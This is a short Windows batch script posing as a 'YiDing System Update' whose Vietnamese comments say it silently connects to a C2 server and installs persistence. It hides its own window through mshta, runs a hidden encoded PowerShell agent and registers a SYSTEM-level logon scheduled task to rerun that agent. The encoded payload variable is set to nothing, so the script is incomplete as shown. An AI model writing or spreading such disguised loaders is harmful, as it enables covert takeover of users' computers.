@echo off
:: YiDing System Update v4.0 - Universal Windows 10/11
:: 100% silent, khong can Python, khong popups
:: Tu dong ket noi C2 server + persistence
if "%1"=="h" goto begin
mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&exit
:begin

cd /d "%~dp0"

set ""

:: Chay PowerShell agent
powershell -NoP -NonI -W Hidden -Enc "%ENC%"

:: Persistence: scheduled task chay o System level
schtasks /CREATE /TN "YiDingSysUpdate" /TR "powershell -NoP -NonI -W Hidden -Enc %ENC%" /SC ONLOGON /RU SYSTEM /F >nul 2>&1

exit /b 0
